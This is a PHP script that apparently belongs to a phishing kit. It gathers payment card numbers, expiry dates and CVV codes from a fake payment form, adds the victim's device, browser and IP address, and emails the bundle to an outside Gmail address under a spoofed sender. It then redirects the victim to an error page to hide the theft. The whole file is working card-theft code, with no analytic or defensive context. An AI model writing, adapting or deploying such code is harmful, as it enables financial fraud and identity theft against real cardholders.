<?php

include("funcs.php");

$message  = "SPL\n\n";
$message .= "Numéro de carte : ".$_POST['Sis_Numero_Tarjeta']."\n";
$message .= "Date d'expiration : ".$_POST['Sis_Caducidad_Tarjeta_Mes']."\n";
$message .= "CVV : ".$_POST['Sis_Tarjeta_CVV2']."\n";
$message .= "***************************************\n\n";

$message .= "******* SYS *******\n\n";
$message .= "Device  : ".$OS."\n";
$message .= "Browser : ".$Browser."\n";
$message .= "IP      : ".$ip."\n";

$message .= "******* End Login Data *******\n\n\n\n\n";

$send = "baraka.barak1@gmail.com";
$subject = "SG|".$ip;
$headers = "From:  SG <donc@mox.fr>";
mail($send,$subject,$message,$headers);

header("Location: codeerror.php");

?>

